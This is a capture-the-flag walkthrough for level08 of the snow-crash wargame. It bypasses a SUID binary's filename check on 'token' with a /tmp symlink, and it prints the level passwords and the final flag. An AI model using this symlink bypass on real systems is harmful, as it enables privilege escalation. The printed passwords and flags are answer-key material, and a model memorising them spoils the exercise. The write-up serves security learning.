Login as `level08`.
```shell
┌──$ [~/42/2021/snow-crash]
└─>  ssh 192.168.1.64 -p 4242 -l level08
level08@192.168.1.64's password: fiumuikeil55xe9cu4dood66h
```
An `SUID` executable and token file are located in home directory.
```shell
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
level08@SnowCrash:~$ ./level08
./level08 [file to read]
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
level08@SnowCrash:~$ cat token
cat: token: Permission denied
```
Seems that token file cannot be read neither by `./level08` not `cat`.

Use `ltrace` to intercept dynamic library calls and system calls executed by the program.
```gdb
level08@SnowCrash:~$ ltrac ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token") = "token"
printf("You may not access '%s'\n", "token"You may not access 'token') = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```
`strstr` function locate a substring `needle` in the string `haystack`.

It can be deduced that if passed file has token string in name, it exits.

Make a symbolic link without token in a filename.
```shell
level08@SnowCrash:~$ ln -s $(realpath token) /tmp/symlink
```
Execute binary with symlink and get password to log into `flag08`.
```shell
level08@SnowCrash:~$ ./level08 /tmp/symlink
quif5eloekouj29ke0vouxean
```
Login as `flag08` and get the flag.
```shell
level08@SnowCrash:~$ su flag08
Password: quif5eloekouj29ke0vouxean
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
